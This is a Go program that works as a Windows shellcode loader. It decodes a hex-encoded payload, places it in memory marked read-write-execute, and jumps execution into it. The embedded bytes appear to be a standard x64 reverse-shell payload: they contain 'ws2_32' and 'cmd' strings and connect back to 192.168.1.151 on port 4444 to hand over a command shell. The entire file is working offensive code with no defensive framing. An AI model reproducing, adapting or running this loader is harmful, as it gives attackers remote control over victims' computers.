package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40 // Crucial flag for execution
)

func main() {
	shellcodeHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a8019741544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5"

	shellcode, err := hex.DecodeString(shellcodeHex)
	if err != nil {
		log.Fatalf("Failed to decode hex string : %v", err)
	}

	size := uintptr(len(shellcode))

	// 1. Allocate memory with EXECUTE permissions
	addr, err := windows.VirtualAlloc(
		0,
		size,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		log.Fatalf("VirtualAlloc failed: %v", err)
	}
	fmt.Printf("[+] Memory allocated with EXECUTE permissions at: 0x%x\n", addr)

	var memSlice []byte
	header := (*sliceHeader)(unsafe.Pointer(&memSlice))
	header.Data = addr
	header.Len = len(shellcode)
	header.Cap = len(shellcode)

	copy(memSlice, shellcode)
	fmt.Println("[+] Shellcode copied to memory successfully.")

	fmt.Println("[+] Jumping execution to allocated memory...")
	ret, _, _ := syscall.Syscall(addr, 0, 0, 0, 0)

	fmt.Printf("[+] Execution finished! Code returned value: %d\n", ret)
	windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
}

// sliceHeader mimics the internal structure of a Go slice so we can manually manipulate it
type sliceHeader struct {
	Data uintptr
	Len  int
	Cap  int
}
